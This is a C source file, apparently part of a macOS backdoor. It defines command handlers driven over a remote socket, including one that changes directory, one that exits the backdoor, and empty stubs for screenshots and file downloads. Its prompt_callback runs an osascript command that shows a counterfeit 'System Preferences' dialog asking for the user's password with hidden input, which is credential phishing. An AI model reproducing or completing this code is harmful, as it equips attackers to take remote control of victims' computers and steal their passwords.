#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#include "help.h"
#include "utils.h"

void change_directory_callback(char* result, int sock) {

	send(sock, "Enter path: ", strlen("Enter path: "), 0);
	
	char path[1024];

	recv(sock, path, 1024, 0);

	int response = chdir(path);

	if(response == -1) {
		sprintf(result, "Error: %i\n", errno);
	} else {
		strcpy(result, "Success\n");
	}
}

void get_help_callback(char* result, int sock) {
	strcpy(result, HELP);
}

void exit_backdoor_callback(char* result, int sock) {
	close(sock);
	exit(0);
}

void prompt_callback(char *result, int sock) {
	const char* cmd = "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"System Preferences requires your password to continue.\" & return  default answer \"\" with icon 1 with hidden answer with title \"System Preferences Alert\"'";

	execute_command(cmd, result);
}

void screenshot_callback(char* result, int sock) {

}

void download_file_callback(char* result, int sock) {

}